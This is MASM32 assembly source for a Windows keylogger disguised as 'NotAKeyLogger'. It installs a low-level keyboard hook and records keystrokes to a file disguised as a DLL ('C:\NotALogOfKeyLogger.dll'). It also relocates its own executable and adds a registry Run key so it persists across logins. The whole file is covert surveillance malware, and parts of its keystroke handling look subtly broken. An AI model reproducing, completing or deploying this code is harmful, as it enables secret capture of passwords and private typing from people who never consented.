include D:\masm32\include\masm32rt.inc

WriteToFile PROTO :DWORD
MakeOrOpenFile PROTO 
WriteSpecialKeyToFile PROTO :DWORD
WinMain PROTO :DWORD, :DWORD, :DWORD, :DWORD
CheckPowerButton PROTO
InstallHook PROTO :DWORD
UninstallHook PROTO 

.DATA
caps DWORD ')PC(', 0
powerButton DWORD ')BP(', 0

fileLocation db 'C:\NotAKeyLogger.exe', 0
valueName db 'NotAKeyLogger', 0
autoKey db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
newLine BYTE " ", 13, 10, 0
fileName BYTE 'C:\NotALogOfKeyLogger.dll', 0

stm SYSTEMTIME <>
ORG stm
wYear		dw 0
wMonth		dw 0
wToDay		dw 0 
wDay			dw 0
wHour		dw 0
wMinute		dw 0
wSecond	dw 0
wKsecond	dw 0
date_buf   db 50 dup (32)
time_buf   db 20 dup (32)
			    db 0
dateformat db " dddd, MMMM, dd, yyyy", 0
timeformat db "hh:mm:ss tt",0

.DATA?
hInstance dd ?
hookInstance dd ?
lpszCmdLine dd ?
fileDescriptor HANDLE ?
nBytes dw ?
hKey dd ?
fileLocationBuffer db 1000 dup(?)
hHook dd ?
programInstance dd ?

.CODE
MAIN:
						INVOKE			MakeOrOpenFile
						INVOKE 		GetModuleHandle, NULL
						mov				hInstance, eax				

						INVOKE			GetCommandLine
						mov				lpszCmdLine, eax

						INVOKE			WinMain, hInstance, 
														  NULL,
														  lpszCmdLine,
														  SW_SHOWDEFAULT

;***************** Stay As Background Process ************************

WinMain PROC hInst:DWORD, hPrevInst:DWORD, szCmdLine:DWORD, nShowCmd:DWORD

LOCAL	msg:MSG

						INVOKE			InstallHook, hInstance
						lea				edx, msg
MessagePump:  INVOKE			GetMessage, edx, NULL, 0, 0
						cmp				eax, 0
						je					MessageEnd
						jmp				MessagePump																	; loop to keep alive	
MessageEnd:		INVOKE			UninstallHook
						ret

WinMain ENDP

;***************** Make Or Open File **********************************

MakeOrOpenFile PROC 

						INVOKE			CreateFile, ADDR fileName, 
															GENERIC_WRITE, 
															FILE_SHARE_WRITE, 
															0, 
															OPEN_ALWAYS, 
															FILE_ATTRIBUTE_NORMAL, 
															0
						mov				fileDescriptor, eax

;***************Write Local Time + Date Of When EXE Launched*************

						INVOKE			GetLocalTime, ADDR stm
						INVOKE			GetDateFormat, 0, 0, ADDR stm, ADDR dateformat, ADDR date_buf, 50 
						mov				ecx, OFFSET date_buf
						add				ecx, eax
						mov				BYTE PTR [ecx - 1], " "
						INVOKE			GetTimeFormat, 0, 0, 0, ADDR timeformat, ecx, 20
						lea				ecx, date_buf
						INVOKE			WriteToFile, ecx
						lea				edx, newLine 
						INVOKE			WriteToFile, edx

;***************Get EXE Location And Move To Other Directory***************

						INVOKE			GetModuleFileName, hInstance, OFFSET fileLocationBuffer, MAX_PATH
						INVOKE			MoveFile, ADDR fileLocationBuffer, ADDR fileLocation

;**************Create Registry Key For Self Startup************************

						INVOKE			RegCreateKeyEx, HKEY_CURRENT_USER, ADDR autoKey, 0, 0, 0, KEY_ALL_ACCESS, 0, ADDR hKey, 0
						INVOKE			lstrlen, ADDR fileLocation
						INVOKE			RegSetValueEx, hKey, ADDR valueName, 0, REG_SZ, ADDR fileLocation, eax
						mov				eax, 1
						ret																						 

MakeOrOpenFile ENDP

;******************Write To File**************************************

WriteToFile PROC msg:DWORD
						
						mov			edi, msg																		  ;get length of string to write in file
						xor			ecx, ecx
						xor			al, al				
						not			ecx
						cld
						repne		scasb
						not			ecx
						dec			ecx
						INVOKE	    WriteFile, fileDescriptor, [msg], ecx, ADDR nBytes, 0          ;keys are logging one by one
						ret

WriteToFile ENDP

;*******************Install Hooks***********************

InstallHook PROC pInst:DWORD

										push			 pInst
										pop			 programInstance
										lea			 ecx, LowLevelKeyboardProc
										INVOKE		 SetWindowsHookEx,  WH_KEYBOARD_LL,
																						ecx,
																						hookInstance,
																						NULL
										mov			 hHook, eax
										ret

InstallHook ENDP

;*******************Uninstall Hooks*********************

UninstallHook PROC

										INVOKE		UnhookWindowsHookEx, hHook
										ret

UninstallHook ENDP

;******************Main Event Hook*********************

LowLevelKeyboardProc PROC nCode:SDWORD, wParam:DWORD, lParam:DWORD

										mov			eax, nCode
										cmp			eax, 0FFFFFFFFh														;check if neg number
										jge			CheckParams
										jmp			CallNextHook

CheckParams:					mov			eax, lParam
										and			eax, 8000000h														;getting 31 bit to check repeat count
										test			eax, eax
										jnz			CallNextHook
										mov		    eax, wParam
										cmp			eax, WM_KEYDOWN												
										je			    CheckIfKeyIsSpecial 
										cmp			eax, WM_SYSKEYDOWN											
										je				CheckIfKeyIsSpecial       	
										jmp			CallNextHook

CheckIfKeyIsSpecial:			call			CheckCapital
										test			eax, eax
										jnz			WriteCapsLockKey
										INVOKE		CheckPowerButton
										test			eax, eax
										jnz			WritePowerButton
										jmp			WriteKey

WriteCapsLockKey:				INVOKE		WriteToFile, OFFSET caps
										jmp			WriteKey

WritePowerButton:				INVOKE		WriteToFile, OFFSET powerButton
										INVOKE		ExitProcess, 0														;can be modified later

WriteKey:							INVOKE		WriteToFile, lParam
										jmp			PostCall

PostCall:							INVOKE		CallNextHookEx, hHook, nCode, WM_KEYUP, lParam	
										ret

CallNextHook:					INVOKE		CallNextHookEx, hHook, nCode, wParam, lParam
										ret

LowLevelKeyboardProc ENDP

;**************Check If Capital Key Is Pressed*************

CheckCapital PROC
										xor			esi, esi
										INVOKE		GetKeyState, VK_CAPITAL
										test			eax, eax
										jnz			Exit
										INVOKE		GetAsyncKeyState, VK_SHIFT
										or				eax, esi
Exit:									ret

CheckCapital ENDP

;**************Check If Power Button Was Pressed*********

CheckPowerButton PROC 

										INVOKE		GetKeyState, VK_SLEEP
										ret

CheckPowerButton ENDP

;********************END****************************

END MAIN